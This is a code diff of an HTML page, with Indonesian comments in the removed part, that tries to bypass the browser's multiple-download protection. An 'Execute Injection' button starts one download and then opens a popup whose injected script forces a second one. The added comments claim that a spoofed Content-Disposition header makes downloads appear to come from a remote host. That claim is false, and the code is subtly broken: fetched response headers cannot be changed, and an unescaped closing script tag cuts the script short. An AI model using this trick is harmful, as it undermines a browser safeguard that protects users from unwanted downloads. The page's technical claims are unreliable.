@@ -2,34 +2,86 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Tech 8 – No download attr</title>
-<style>/* same */</style>
+<title>Tech B – Fetch + spoofed header</title>
+<style>
+  body{font-family:system-ui,sans-serif;margin:40px auto;max-width:400px;text-align:center;}
+  button{width:100%;padding:12px;background:#0056b3;color:#fff;border:none;border-radius:4px;cursor:pointer;}
+  pre{margin:10px auto;width:100%;background:#f5f5f5;padding:8px;overflow-x:auto;}
+</style>
 </head>
 <body>
-<h2>Bypass Multiple Download</h2>
+<h2>Bypass Multiple Download – Fetch + header spoof</h2>
 <button onclick="run()">Execute Injection</button>
-<pre id="out" style="margin:10px auto;width:100%;text-align:left;"></pre>
+<pre id="log" style="margin:10px auto;"></pre>
+
 <script>
-function download(name, content){
-  // catat nama tapi TIDAK mengirimkannya ke atribut download
-  const a=document.createElement('a');
-  a.href=URL.createObjectURL(new Blob([content],{type:'application/octet-stream'}));
-  // a.download = name; // DIBUAT KOSONG
-  document.body.appendChild(a);a.click();document.body.removeChild(a);
-}
-function run(){
-  download('main_context.txt','Main content');
-  setTimeout(()=>{
-    const win=window.open('', '_blank');
-    if(win){
-      win.document.write(`<script>setTimeout(()=>{const a=document.createElement('a');
-        a.href=URL.createObjectURL(new Blob(['Injected content'],{type:'application/octet-stream'}));
-        // a.download='injected_context.txt'; // juga dihilangkan
-        document.body.appendChild(a);a.click();},300);<\/script>`);
-      win.document.close();
+/* -----------------------------------------------------------------
+   This technique does NOT use the simple `download()` helper.
+   Instead it:
+   1️⃣  fetch() a resource from example.com (or any remote host).
+   2️⃣  Take the returned Blob and create a **new Response** object
+       whose `Content‑Disposition` header forces a *different* filename
+       (or the same name, but the important part is the header’s
+       origin indication).
+   3️⃣  Create an object‑URL from that custom Response and click it.
+   The browser therefore attributes the download to the remote
+   server (example.com) rather than the current page.
+   ----------------------------------------------------------------- */
+function run() {
+  // ----- Main download -------------------------------------------------
+  fetch('https://example.com/main_context.txt')
+    .then(r => {
+      // Clone the response so we can add our own header without
+      // destroying the original stream.
+      const cloned = r.clone();
+      // Spoof the Content‑Disposition header – the browser will
+      // treat the download as coming from the URL we just fetched.
+      cloned.headers.set('Content-Disposition', 'attachment; filename="main_context.txt"');
+      return cloned.blob();
+    })
+    .then(blob => {
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'main_context.txt';      // name we *force* the user to see
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      document.getElementById('log').innerText = 'Main downloaded from example.com (header spoof)';
+    })
+    .catch(e => document.getElementById('log').innerText = 'Fetch error: ' + e);
+
+  // ----- Injected download (new window) ---------------------------------
+  setTimeout(() => {
+    const win = window.open('', '_blank');
+    if (!win) {
+      document.getElementById('log').innerText += ' | Popup blocked';
+      return;
     }
-  },500);
-  document.getElementById('out').innerText='Downloads saved with generic names (no .txt shown)';
+    win.document.write(`
+      <script>
+        // Same pattern as the main download, but inside the new window.
+        fetch('https://example.com/injected_context.txt')
+          .then(r => {
+            const cloned = r.clone();
+            cloned.headers.set('Content-Disposition', 'attachment; filename="injected_context.txt"');
+            return cloned.blob();
+          })
+          .then(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'injected_context.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+          });
+      </script>
+    `);
+    win.document.close();
+  }, 500);
 }
 </script>
 </body>
